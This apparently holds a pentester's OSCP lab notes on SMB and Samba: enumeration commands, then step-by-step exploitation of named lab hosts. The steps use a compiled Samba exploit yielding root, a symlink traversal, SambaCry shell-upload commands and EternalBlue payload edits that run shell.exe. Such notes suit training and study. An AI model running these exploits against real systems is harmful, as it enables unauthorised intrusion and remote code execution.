@@ -1,0 +1,138 @@
+# Enumeration
+1) NSE scripts
+2) try to view contents
+3) look for vulnerabilities
+4) last resort
+	use wireshark to find version
+
+# NSE
+sudo nmap -p 139,445 --script smb-protocols <ip>
+sudo nmap -sU -sS -p T:139,U:137 --script smb-enum-users.nse 10.1.1.68
+sudo nmap -p 139,445 --script smb-vuln* <ip>
+sudo nmap -p 139,445 --script smb-* <ip>
+sudo nmap -sU -sS --script smb-enum-shares.nse -p 139 <ip>
+# 10.11.1.146 SUSIE
+# 10.11.1.231 MAILMAN
+nmap -Pn --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 10.11.1.146
+
+# view contents
+smbclient -N -L //<ip>
+smbclient -N \\\\<ip>\\<share name> -c 'ls;cat file.txt; quit'
+smbclient -U '%' -L //<ip>
+smbclient -U '<username>%<password>' -L //<ip>
+smbmap -H 10.11.1.146
+enum4linux -a <ip>
+
+# view share info
+rpcclient -U '' -N <ip>
+	#run netsharegetinfo to get share info
+	netsharegetinfo <share name>
+
+# wireshark version
+# 10.11.1.115 TOPHAT
+# if we cannot find the smb version used, wireshark will display it in the "Session Setup AndX Response" SMB packet.
+
+
+
+# Exploits
+# samba 2.2.7 is vulnerable to https://www.exploit-db.com/exploits/10
+# 10.11.1.115 TOPHAT
+gcc 10.c -o sambal
+...
+Linux tophat.acme.com 2.4.20-8 #1 Thu Mar 13 17:54:28 EST 2003 i686 athlon i386 GNU/Linux
+uid=0(root) gid=0(root) groups=99(nobody)
+
+# samba 3.0.24 is vulnerable to symlink directory traversal https://www.exploit-db.com/exploits/33599
+# You will need to use a custom compiled version of samba
+cd ~/OSCP-labs/notes/smb/samba-3.4.5/
+# 10.11.1.136 SUFFERANCE
+$ export LD_LIBRARY_PATH="/home/kali/OSCP-labs/notes/smb/samba-3.4.5/lib"
+$ ./smbclient -N "\\\\10.11.1.136\\Bob Share"params.c:OpenConfFile() - Unable to open configuration file "/home/kali/OSCP-labs/notes/smb/samba-3.4.5/lib/smb.conf":
+        No such file or directory
+./smbclient: Can't load /home/kali/OSCP-labs/notes/smb/samba-3.4.5/lib/smb.conf - run testparm to debug it
+Domain=[THINC.LOCAL] OS=[Unix] Server=[Samba 3.0.24]
+Server not using user level security and no password supplied.
+smb: \> symlink / rootfs
+smb: \> ls
+  .                                   D        0  Sun Jul  3 21:27:06 2022
+  ..                                  D        0  Sat Jan 29 13:07:11 2011
+  rootfs                              D        0  Wed Aug 26 05:54:18 2009
+  
+# SMBv1 on windows is vulnerable to ms08-067 and ms17-010
+# 10.11.1.5 ALICE
+$ sudo nmap -p 139,445 --script smb-protocols 10.11.1.5
+[sudo] password for kali: 
+Starting Nmap 7.80 ( https://nmap.org ) at 2022-07-04 13:06 EDT
+Nmap scan report for 10.11.1.5
+Host is up (0.024s latency).
+
+PORT    STATE SERVICE
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-protocols: 
+|   dialects: 
+|_    NT LM 0.12 (SMBv1) [dangerous, but default]
+
+Nmap done: 1 IP address (1 host up) scanned in 0.85 seconds
+$ sudo nmap -p 139,445 --script smb-vuln* 10.11.1.5
+Starting Nmap 7.80 ( https://nmap.org ) at 2022-07-04 13:03 EDT
+Nmap scan report for 10.11.1.5
+Host is up (0.024s latency).
+
+PORT    STATE SERVICE
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-vuln-ms08-067: 
+|   VULNERABLE:
+|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2008-4250
+|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
+|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
+|           code via a crafted RPC request that triggers the overflow during path canonicalization.
+|           
+|     Disclosure date: 2008-10-23
+|     References:
+|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+
+Nmap done: 1 IP address (1 host up) scanned in 16.81 seconds
+
+# Eternalred/sambacry
+# 10.11.1.146 SUSIE
+# ~/OSCP-labs/notes/smb/exploit-CVE-2017-7494
+./exploit.py -t 10.11.1.146 -e shell.so -s susieshare -r /home/susie/susieshare/shell.so
+# ~/OSCP-labs/notes/smb/CVE-2017-7494
+python cve_2017_7494.py -t 10.11.1.146 -m /home/susie/susieshare/shell.so --custom shell.so
+
+# smbv1 on windows 8.1 enterprise 6.3 is vulnerable to eternal blue
+# 10.11.1.75 BRUCE
+https://www.exploit-db.com/exploits/42315
+https://github.com/worawit/MS17-010
+# edit lines 916-920 with your payload
+	print('executing "C:\shell.exe')
+	smb_send_file(smbConn, 'shell.exe', 'C', '/shell.exe')
+	service_exec(conn, r'C:\shell.exe')
+	
+# smbv1 on OS: Windows 2000 (Windows 2000 LAN Manager) is vulnerable to eternal blue and ms08-067
+https://www.exploit-db.com/exploits/42315
